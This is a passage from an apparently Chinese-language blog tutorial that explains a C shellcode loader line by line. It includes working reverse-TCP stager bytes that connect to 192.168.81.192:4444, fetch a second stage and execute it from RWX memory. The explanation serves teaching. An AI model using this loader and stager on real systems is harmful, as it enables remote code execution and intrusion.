        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x51\xc0\x68\x02"
        "\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
        "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
        "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
        "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3";

    typedef void (__stdcall *CODE) ();  
    
    PVOID p = NULL;    
    if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)   
        MessageBoxA(NULL, "error", "VirtualAlloc", MB_OK);    
    if (!(memcpy(p, shellcode1, sizeof(shellcode1))))    
        MessageBoxA(NULL, "error", "memcpy", MB_OK);    
    CODE code =(CODE)p;       
    code(); 

    return 0;
}
```

**关键代码分析：**

<u>第一段：</u>

```
typedef void (__stdcall *CODE) ();  
```

想象以下这样一个函数原型：

```
void  __stdcall functionName();
```

注：声明函数的约定调用（参考：[C/C++ 函数调用约定（__cdecl、__stdcall、__fastcall）](https://blog.csdn.net/hellokandy/article/details/54603055)）：

![title](https://leanote.com/api/file/getImage?fileId=5f2d48c6ab644176ca000c7c)


然后将函数原型换成名为 `CODE` 的函数指针：

```
void  (__stdcall *CODE) ();
```

最后它加上了一个 `Typedef` 关键字，我有点晕。就当是把一个匿名函数（函数签名为：返回值 Void，无参数）起了一个别名为 `CODE` 吧。

<u>第二段：</u>


```
    PVOID p = NULL;    
    if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)   
        MessageBoxA(NULL, "error", "VirtualAlloc", MB_OK);    
    if (!(memcpy(p, shellcode1, sizeof(shellcode1))))    
        MessageBoxA(NULL, "error", "memcpy", MB_OK);    
```


这段就是普普通通的，中规中矩：

- 使用 `VirtualAlloc` API 在任意空闲内存中开辟了一段 shellcode 长度、 RWX 权限的内存空间。将地址返回给 p 通用指针（void 指针为通用指针）。
- 使用 `memcpy` 函数将 shellcode 的内容复制到 p 指针指向的缓冲区。
- 如果这两个函数错误（第一个函数返回空指针，第二个函数返回 FALSE），则弹窗报错。

<u>第三段：</u>


```
    CODE code =(CODE)p;       
    code(); 
```

`Code code`：通过前面的 `Typedef` 关键字，定义了一个函数指针类型，类型别名为 Code。
`(CODE)p`：前面说过的，如果 WIN API 的返回类型定义的是通用指针，那么在 C++ 代码中一定需要/在 C 代码中推荐强转指针类型，就把此 p 指针的类型强转为了 CODE 类型，那么实际上 code 就被定义为一个函数指针类型，其值为 p。编译器在解析这一句的时候，站在编译器的角度，shellcode 和函数没有任何区别。对于函数，传入一个函数名，那么实际上也就是函数的地址。对于 shellcode，传入 shellcode 的起始地址，然后编译器会去执行从起始地址开始的这一段内存块的功能，对于编译器来说是函数还是 shellcode 没有任何区别。所以 code 函数指针可以被赋值为一个值为 shellcode 地址的指针。
`code()`：code 是函数指针，就相当于函数名。那么`函数名()` 就相当于执行此函数，从函数指针指向的地址开始执行，就执行了 shellcode。














---------------------


## 参考文档：


1. [傀儡进程的实现与检测](https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/)，3gstudent，3gstudent's blog，2017-11-30
2. [RemoteFreeLibrary](https://www.zcgonvh.com/post/RemoteFreeLibrary.html)，zcgonvh，草泥马之家，2019-10-26
3. [Cobalt Strike’s Process Injection: The Details](https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/)，Cobalt Strike，Cobalt Strike's blog, 2019-8-21
